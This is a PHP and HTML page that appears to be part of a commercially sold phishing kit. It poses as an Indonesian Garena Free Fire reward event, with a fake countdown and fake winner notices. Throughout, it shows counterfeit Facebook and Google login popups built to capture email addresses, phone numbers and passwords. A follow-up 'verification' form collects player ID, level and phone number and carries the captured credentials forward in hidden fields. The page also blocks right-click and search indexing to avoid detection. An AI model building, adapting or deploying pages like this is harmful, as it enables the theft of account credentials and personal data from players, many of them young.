<?php
// CREATOR KANG SCRIPT
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/62891630150

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head> 
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <title>Garena Free Fire. Game genre Battle Royale mobile terbaik!</title> 
  <meta name="robots" content="noindex, nofollow"> 
  <meta property="og:description" content="Free Fire adalah game mobile battle royale terbaik, diunduh lebih dari 1 milyar pemain di seluruh dunia, dikembangkan oleh Garena untuk Android dan iOS. Battle in Style dan jadi survivor yang bertahan"> 
  <meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg"> 
  <meta property="og:image:width" content="540"> 
  <meta property="og:image:height" content="282"> 
  <link href="./index_files/css" rel="stylesheet"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/style.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/facebook.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/twitter.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/vkontakte.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/google.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/link.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/flaglink.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/animate.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/style-zone.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/2/zero-zone.css"> 
  <link rel="stylesheet" href="https://images.alex-hosting.my.id/css/1/style-zone.css"> 
  <style type="text/css">@font-face {font-family:Teko;font-style:normal;font-weight:400;src:url(/cf-fonts/v/teko/5.0.18/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Teko;font-style:normal;font-weight:400;src:url(/cf-fonts/v/teko/5.0.18/devanagari/wght/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Teko;font-style:normal;font-weight:400;src:url(/cf-fonts/v/teko/5.0.18/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}</style> 
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"> 
  <link rel="icon" type="img/png" href="https://freefiremobile-a.akamaihd.net/common/web_event/common/images/ff-logo-icon.png" sizes="32x32"> 
 </head> 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style=""> 
  <style type="text/css">
         @charset "utf-8";
         @import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
         *,
         *:before,
         *:after {
         -webkit-box-sizing: border-box;
         -moz-box-sizing: border-box;
         box-sizing: border-box;
         }
         @font-face {
         font-family: 'laza';
         font-style: normal;
         font-weight: 700;
         src:
         url(fonts/laza.woff2) format("woff2"),
         url(fonts/laza.woff) format("woff"),
         url(fonts/laza.ttf) format("truetype");
         }
         @font-face {
         font-family: 'laza2';
         font-style: normal;
         font-weight: 700;
         src:
         url(fonts/laza2.ttf) format("truetype")
         }
         
      </style> 
  <div class="slider-container"> 
   <div class="navbar"> 
    <img class="navbar-logo" src="https://images.alex-hosting.my.id/img/2/style-img/logo.png"> 
    <div class="navbar-right"> 
     <img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg"> 
     <img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg"> 
    </div> 
   </div> 
  </div> 
  <div class="header"> 
   <img src="https://images.alex-hosting.my.id/img/2/lazaheader/1.jpg" class="width: 100%;"> 
  </div> 
  <div class="laz-home"> 
   <div class="laz-container" style="margin-top:-1px;"> 
    <div> 
     <br> 
     <br> 
     <br> 
     <br> 
     <br> 
     <div class="event-title" style="opacity: 0%;"></div> 
     <div class="event-title2" style="opacity: 0%;"></div> 
     <div class="timer">
      EVENT TERBATAS
      <br>BERAKHIR PADA: 
      <i class="fa-solid fa-stopwatch fa-shake"></i>
      <span id="timer1" style="animation: fade .6s infinite alternate;color: #ff2c2c;"> 23 : 59 : 57</span>
     </div> 
     <div class="notifgift linemotion"> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3585****23 Mendapatkan NEON GLOW BUNDLE
      </div> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 5266****04 Mendapatkan MECHANICAL WINGS
      </div> 
      <div class="slider animated fadeIn" style="display: block;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 8284****33 Mendapatkan M1887 - STERLING CONQUEROR
      </div> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3980****78 Mendapatkan M1887 - ONI - SAKURA
      </div> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 5766****890 Mendapatkan M1887 - METEOR
      </div> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3538****27 Mendapatkan AK47 - DRACO
      </div> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3340****71 Mendapatkan M1887 - RAPPER
      </div> 
      <div class="slider animated fadeIn" style="display: none;">
       <i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 6582****342 Mendapatkan M1887 - ONEPUCHMAN
      </div> 
     </div> 
    </div> 
    <div class="box-rewards"> 
     <div class="box-item-rewards"> 
      <div class="scroll"> 
       <center> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/1.jpg" item-name="NEON GLOW BUNDLE" item-total="" item-price="5000"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/1.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; NEON GLOW BUNDLE</a> 
            <a>&nbsp; NEON GLOW BUNDLE</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">5000 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/10.jpg" item-name="MECHANICAL WINGS" item-total="" item-price="5000"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/10.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; MECHANICAL WINGS</a> 
            <a>&nbsp; MECHANICAL WINGS</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">5000 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/5.jpg" item-name="RAPPER - ANGEL" item-total="" item-price="4000"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/5.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; RAPPER - ANGEL</a> 
            <a>&nbsp; RAPPER - ANGEL</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">4000 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/7.jpg" item-name="OLD MAN'S MASK" item-total="" item-price="3500"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/7.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; OLD MAN'S MASK</a> 
            <a>&nbsp; OLD MAN'S MASK</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">3500 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/8.jpg" item-name="M1014 - GREEN FLAME DRACO" item-total="" item-price="3500"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/8.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; M1014 - GREEN FLAME DRACO</a> 
            <a>&nbsp; M1014 - GREEN FLAME DRACO</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">3500 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/9.jpg" item-name="M1887 - STERLING CONQUEROR" item-total="" item-price="3500"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/9.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; M1887 - STERLING CONQUEROR</a> 
            <a>&nbsp; M1887 - STERLING CONQUEROR</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">3500 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/2.jpg" item-name="M1887 - ONEPUCHMAN" item-total="" item-price="3000"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/2.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp;M1887 - ONEPUCHMAN</a> 
            <a>&nbsp;M1887 - ONEPUCHMAN</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">3000 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/3.jpg" item-name="AK47 - DRACO" item-total="" item-price="3000"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/3.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; AK47 - DRACO</a> 
            <a>&nbsp; AK47 - DRACO</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">3000 </p>
         </div> 
        </div> 
        <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.alex-hosting.my.id/img/2/reward/withBg/4.jpg" item-name="M1887 - RAPPER" item-total="" item-price="3000"> 
         <div> 
          <figure> 
           <img style="border-bottom: 0px;" src="https://images.alex-hosting.my.id/img/2/reward/4.png"> 
          </figure> 
         </div> 
         <div> 
          <div class="item-label"> 
           <div class="marquee"> 
            <a>&nbsp; M1887 - RAPPER</a> 
            <a>&nbsp; M1887 - RAPPER</a> 
           </div> 
          </div> 
          <p><img src="https://images.alex-hosting.my.id/img/2/tokens.png">3000 </p>
         </div> 
        </div> 
       </center> 
      </div> 
     </div> 
    </div> 
   </div> 
  </div> 
  <!-- box-item ---> 
   </div> 
   <!-- box ---> 
  </div> 
  <!-- container-box ---> 
  <!-- laz-container ---> 
  <!-- laz-home ---> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a onmousedown="tutup.play();" onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a> 
    <div class="navbar-fb"> 
     <img src="https://images.alex-hosting.my.id/img/1/facebook-text.png"> 
    </div> 
    <div class="content-box-fb"> 
     <p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">Alamat email atau nomor telepon yang Anda masukkan tidak cocok dengan akun mana pun. <b>Mendaftarlah untuk sebuah akun.</b></p> 
     <p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">Kata sandi yang Anda masukkan salah. Lupa kata sandi?</p> 
     <img src="https://images.alex-hosting.my.id/img/1/icon_2.jpg"> 
     <div class="txt-login-fb">
       Masuk ke akun Facebook Anda untuk terhubung dengan Garena Free Fire 
     </div> 
     <form class="login-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataFB"> 
      <div class="form-group-fb"> 
       <input type="text" name="email" id="email-facebook" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Masukkan nomor Ponsel atau alamat email')" oninput="setCustomValidity('')"> 
       <div class="form-group-sohid showFbPassword" onclick="showFbPassword()"> 
        <img src="https://images.alex-hosting.my.id/img/1/Fgn-Show-Password.png"> 
       </div> 
       <div class="form-group-sohid hideFbPassword" style="display: none;" onclick="hideFbPassword()"> 
        <img src="https://images.alex-hosting.my.id/img/1/Fgn-Hide-Password.png"> 
       </div> 
       <input type="password" name="password" id="password-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Masukkan kata sandi')" oninput="setCustomValidity('')"> 
      </div> 
      <input type="hidden" name="login" id="login-facebook" value="Facebook" readonly> 
      <button type="submit" class="btn-login-fb" onclick="FGNValidateLoginFbData()">Masuk</button> 
     </form> 
     <div class="txt-create-account">
       Buat Akun 
     </div> 
     <div class="txt-not-now">
       Tidak sekarang 
     </div> 
     <div class="txt-forgotten-password">
       Lupa Kata Sandi? 
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
        Bahasa Indonesia 
      </div> 
      <div class="language-name">
        English (UK) 
      </div> 
      <div class="language-name">
        Türkçe 
      </div> 
      <div class="language-name">
        Tiếng Việt 
      </div> 
      <div class="language-name">
        日本語 
      </div> 
      <div class="language-name">
        Español 
      </div> 
      <div class="language-name">
        Português (Brasil) 
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
      Meta © 2025 
    </div> 
   </div> 
  </div> 
  <!-- popup-login ---> 
  <div class="popup-login login-google animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-google"> 
    <a onmousedown="tutup.play();" onclick="tutup_google()" class="close-other"><i class="zmdi zmdi-close"></i></a> 
    <div class="box-google"> 
     <div class="header-google"> 
      <svg viewbox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf"> 
       <g id="qaEJec"> 
        <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path> 
       </g> 
       <g id="YGlOvc"> 
        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path> 
       </g> 
       <g id="BWfIk"> 
        <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path> 
       </g> 
       <g id="e6m3fd"> 
        <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path> 
       </g> 
       <g id="vbkDmc"> 
        <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path> 
       </g> 
       <g id="idEJde"> 
        <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path> 
       </g> 
      </svg> 
     </div> 
     <div class="txt-login-google">
       Masuk 
     </div> 
     <div class="txt-login-google-desc">
       menggunakan akun Google Anda 
     </div> 
     <form action="javascript:void(0)" method="post" id="ValidateVerificationDataGP"> 
      <div class="input-box"> 
       <label class="input-label">Email atau nomor ponsel</label> 
       <input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required> 
      </div> 
      <div class="input-box"> 
       <label class="input-label">Kata sandi</label> 
       <input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required> 
      </div> 
      <input type="hidden" name="login" id="login-google" value="Google" readonly> 
      <div class="notify-google email-gg" style="margin-top: 5px; margin-bottom: 5px; color: red; display: none;">
        Maaf, kami tidak bisa menemukan akun Anda. 
      </div> 
      <div class="notify-google sandi-gg" style="margin-top: 5px; margin-bottom: 5px; color: red; display: none;">
        Kata sandi salah! 
      </div> 
      <div class="email-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"> 
       <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewbox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"> 
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path> 
       </svg> Couldn't find your Google account. 
      </div> 
      <div class="sandi-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"> 
       <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewbox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"> 
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path> 
       </svg> Wrong password, try again. 
      </div> 
      <button type="button" class="btn-forgot-google">Lupa email?</button> 
      <br> 
      <div class="notify-google">
        Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. 
       <span>Selengkapnya</span> 
      </div> 
      <br> 
      <button type="submit" class="btn-login-google" onclick="FGNValidateLoginGoogleData()">Lanjut</button> 
      <button type="button" class="btn-create-google">Buat akun</button> 
     </form> 
     <br> 
     <br> 
    </div> 
   </div> 
  </div> 
  <div class="popup-login login-google-load animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-google"> 
    <div class="box-google"> 
     <div class="header-google"> 
      <svg viewbox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf"> 
       <g id="qaEJec"> 
        <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path> 
       </g> 
       <g id="YGlOvc"> 
        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path> 
       </g> 
       <g id="BWfIk"> 
        <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path> 
       </g> 
       <g id="e6m3fd"> 
        <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path> 
       </g> 
       <g id="vbkDmc"> 
        <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path> 
       </g> 
       <g id="idEJde"> 
        <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path> 
       </g> 
      </svg> 
     </div> 
     <!-- header-google ---> 
     <br> 
     <br> 
     <i class="zmdi zmdi-spinner zmdi-hc-4x zmdi-hc-spin" style="color: #1a73e8;margin-top: 86px;"></i> 
     <br> 
     <br> 
     <br> 
    </div> 
    <!-- box-google ---> 
   </div> 
  </div> 
  <div class="popup account_verification animated fadeIn" style="display: none;"> 
   <div class="popup-box-wrapperz"> 
    <div class="popup-box-navbarz"> 
     <div class="popup-box-navbar-title">
      Verifikasi Akun
     </div> 
    </div> 
    <div class="popup-box-bgz"> 
     <div class="popup-box-alert4">
      <br>Lengkapi detail akun Garena Free Fire Anda
     </div> 
     <form class="popup-box-form" action="javascript:void(0)" method="post" id="FormFB"> 
      <input type="hidden" name="email" id="validateEmail" readonly> 
      <input type="hidden" name="password" id="validatePassword" readonly> 
      <input type="number" name="playid" id="playid" placeholder="ID Pemain" autocomplete="off" required oninvalid="this.setCustomValidity('Masukkan ID Pemain Anda')" oninput="setCustomValidity('')"> 
      <input type="keyboard" name="nickname" id="nickname" placeholder="Nickname" autocomplete="off" required oninvalid="this.setCustomValidity('nickname')" oninput="setCustomValidity('')"> 
      <select style="color:#fff;" name="level" id="level" required oninvalid="this.setCustomValidity('Pilih Tingkat Akun Anda')" oninput="setCustomValidity('')"> <option selected disabled value="">Tingkat Akun</option> <script>
                        for(var i = 1; i <= 100; i++){
                        	document.write("<option>" + i + "</option>");
                        };
                     </script><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option><option>32</option><option>33</option><option>34</option><option>35</option><option>36</option><option>37</option><option>38</option><option>39</option><option>40</option><option>41</option><option>42</option><option>43</option><option>44</option><option>45</option><option>46</option><option>47</option><option>48</option><option>49</option><option>50</option><option>51</option><option>52</option><option>53</option><option>54</option><option>55</option><option>56</option><option>57</option><option>58</option><option>59</option><option>60</option><option>61</option><option>62</option><option>63</option><option>64</option><option>65</option><option>66</option><option>67</option><option>68</option><option>69</option><option>70</option><option>71</option><option>72</option><option>73</option><option>74</option><option>75</option><option>76</option><option>77</option><option>78</option><option>79</option><option>80</option><option>81</option><option>82</option><option>83</option><option>84</option><option>85</option><option>86</option><option>87</option><option>88</option><option>89</option><option>90</option><option>91</option><option>92</option><option>93</option><option>94</option><option>95</option><option>96</option><option>97</option><option>98</option><option>99</option><option>100</option> <option>1</option> <option>2</option> <option>3</option> <option>4</option> <option>5</option> <option>6</option> <option>7</option> <option>8</option> <option>9</option> <option>10</option> <option>11</option> <option>12</option> <option>13</option> <option>14</option> <option>15</option> <option>16</option> <option>17</option> <option>18</option> <option>19</option> <option>20</option> <option>21</option> <option>22</option> <option>23</option> <option>24</option> <option>25</option> <option>26</option> <option>27</option> <option>28</option> <option>29</option> <option>30</option> <option>31</option> <option>32</option> <option>33</option> <option>34</option> <option>35</option> <option>36</option> <option>37</option> <option>38</option> <option>39</option> <option>40</option> <option>41</option> <option>42</option> <option>43</option> <option>44</option> <option>45</option> <option>46</option> <option>47</option> <option>48</option> <option>49</option> <option>50</option> <option>51</option> <option>52</option> <option>53</option> <option>54</option> <option>55</option> <option>56</option> <option>57</option> <option>58</option> <option>59</option> <option>60</option> <option>61</option> <option>62</option> <option>63</option> <option>64</option> <option>65</option> <option>66</option> <option>67</option> <option>68</option> <option>69</option> <option>70</option> <option>71</option> <option>72</option> <option>73</option> <option>74</option> <option>75</option> <option>76</option> <option>77</option> <option>78</option> <option>79</option> <option>80</option> <option>81</option> <option>82</option> <option>83</option> <option>84</option> <option>85</option> <option>86</option> <option>87</option> <option>88</option> <option>89</option> <option>90</option> <option>91</option> <option>92</option> <option>93</option> <option>94</option> <option>95</option> <option>96</option> <option>97</option> <option>98</option> <option>99</option> <option>100</option> </select> 
      <input type="number" name="phone" id="phone" placeholder="Nomor Ponsel" autocomplete="off" required oninvalid="this.setCustomValidity('Masukkan Nomor Telepon Anda')" oninput="setCustomValidity('')"> 
      <input type="hidden" name="login" id="validateLogin" readonly> 
      <br> 
      <br> 
      <div class="popup-box-form-footer"> 
       <button type="submit" onmousedown="buka.play();" onclick="FGNValidateVerificationData()" style="margin-top: -6px;">Verifikasi</button> 
      </div> 
     </form> 
    </div> 
   </div> 
  </div> 
  <div class="popup check_verification animated fadeIn" style="display: none;"> 
   <div class="popup-box-wrapperz"> 
    <div class="popup-box-navbarz"> 
     <div class="popup-box-navbar-title">
      Akun Verifikasi
     </div> 
    </div> 
    <div class="popup-box-bgx"> 
     <div class="popup-box-alert8">
      <br> 
      <i class="fa-solid fa-circle-notch fa-spin" style="color: #737373;font-size: 50px;margin-bottom: 14px;"></i> 
      <br> Memproses Detail Akun Anda... 
      <br>
      <br> 
     </div> 
     <div class="popup-box-footer"></div> 
    </div> 
   </div> 
  </div> 
